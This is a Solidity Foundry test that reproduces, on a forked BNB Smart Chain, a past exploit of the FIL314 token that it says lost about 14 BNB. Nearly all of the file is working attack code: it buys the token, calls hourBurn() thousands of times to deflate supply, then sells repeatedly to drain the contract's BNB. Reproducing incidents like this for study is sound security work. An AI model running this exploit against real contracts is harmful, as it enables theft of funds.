// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~14 BNB
// Attacker : https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c
// Attack Contract : https://bscscan.com/address/0xde521fbbbb0dbcfa57325a9896c34941f23e96a0
// Vulnerable Contract : https://bscscan.com/address/0xe8a290c6fc6fa6c0b79c9cfae1878d195aeb59af
// Attack Tx : https://bscscan.com/tx/0x9f2eb13417190e5139d57821422fc99bced025f24452a8b31f7d68133c9b0a6c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe8a290c6fc6fa6c0b79c9cfae1878d195aeb59af#code


interface IFIL314 {
    function getAmountOut(uint256 value, bool buy) external returns (uint256);
    function hourBurn() external;
    function transfer(address to,uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FIL314 is Test {
    uint256 blocknumToForkFrom = 37795991;
    IFIL314 FIL314 = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);

    function setUp() public {

        vm.createSelectFork("bsc", blocknumToForkFrom);
    }

    function testExploit() public {
        // Implement exploit code here
         emit log_named_decimal_uint(" Attacker BNB Balance Before exploit", address(this).balance, 18);
         // buy FIL314 token
         address(FIL314).call{value: 0.05 ether}("");
         // deflate the token
         for (uint256 i = 0; i < 6000; i++) {
            FIL314.hourBurn();
        }
        for (uint256 i = 0; i < 10; i++) {
            uint256 amount = FIL314.getAmountOut(address(FIL314).balance,true);
            // sell the token
            FIL314.transfer(address(FIL314), amount);
        }

        // Log balances after exploit
        emit log_named_decimal_uint(" Attacker BNB Balance After exploit", address(this).balance, 18);
    }

    fallback() external payable {}
}
